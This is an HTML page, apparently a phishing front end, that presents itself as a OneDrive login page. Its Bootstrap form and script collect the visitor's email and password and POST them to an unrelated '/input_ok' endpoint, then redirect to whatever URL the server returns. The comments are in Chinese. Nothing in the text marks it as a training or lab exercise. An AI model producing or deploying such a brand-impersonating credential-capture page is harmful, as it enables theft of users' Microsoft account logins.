<!DOCTYPE html>
<html>
<head>
  <title>My Stylish Webpage</title>
  <!-- Link to Bootstrap CSS -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
  <style>
    /* 添加背景图片 */
    .bg-image {
      background-image: url('images/bk2.jpg');
      background-size: cover;
      background-repeat: no-repeat;
      background-attachment: fixed;
    }
    /* 设置输入框透明 */
    .transparent-input {
      background-color: rgba(255,255, 255, 0.5);
    }
    .transparent-input:hover {
      background-color: rgb(223, 194, 198) ;
    }

  </style>

</head>
<body class="bg-image">
  <div class="container text-center mt-4" style="min-height: 10vh;">
    <h1 class="display-3">Welcome to My OneDrive Login Page</h1>
    <p class="lead">Please enter your email and password to access my OneDrive.</p>
  </div>

  <div class="container d-flex flex-column align-items-center justify-content-center" style="min-height: 55vh;">
    <div class="col-md-6">
      <form action="/input_ok" method="post">
        <div class="mb-3 row">
          <label for="inputEmail3" class="col-sm-2 col-form-label">Email</label>
          <div class="col-sm-10">
            <input type="email" class="form-control transparent-input" id="inputEmail3">
          </div>
        </div>
        <div class="mb-3 row">
          <label for="inputPassword3" class="col-sm-2 col-form-label">Password</label>
          <div class="col-sm-10">
            <input type="password" class="form-control transparent-input" id="inputPassword3">
          </div>
        </div>

        <div class="text-center"> <!-- 居中显示登录按钮 -->
          <button type="submit" class="btn btn-primary">Sign in</button>
        </div>
      </form>
    </div>
  </div>

  <div class="container d-flex align-items-center justify-content-center" style="min-height: 20vh;">
    <a class="icon-link icon-link-hover" style="--bs-link-hover-color-rgb: 25, 135, 84;" href="#">
      <i class="fas fa-home home-icon"></i>
      <svg class="bi" aria-hidden="true"><use xlink:href="#arrow-right"></use></svg>
    </a>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.min.js"></script>
  <script>
    document.addEventListener('DOMContentLoaded', function () {
      const form = document.querySelector('form'); // 获取表单元素
    
      form.addEventListener('submit', function (event) {
        event.preventDefault(); // 阻止默认的表单提交行为
    
        // 获取用户输入的邮箱和密码
        const email = document.querySelector('#inputEmail3').value;
        const password = document.querySelector('#inputPassword3').value;
    
        // 发送 POST 请求到服务器
        fetch('/input_ok', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
          },
          body: `email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`
        })
        .then(response => {
          // 不需要在前端处理重定向，服务器会返回重定向的响应
          // 可以根据服务器返回的状态码和响应内容进行处理
          if (response.ok) {
            window.location.href = response.url; // 重定向到服务器返回的URL
          } else {
            console.error('Login failed');
            // 根据需要进行错误处理
          }
        })
        .catch(error => {
          console.error('Error:', error);
        });
      });
    });
    </script>
    
</body>
</html>
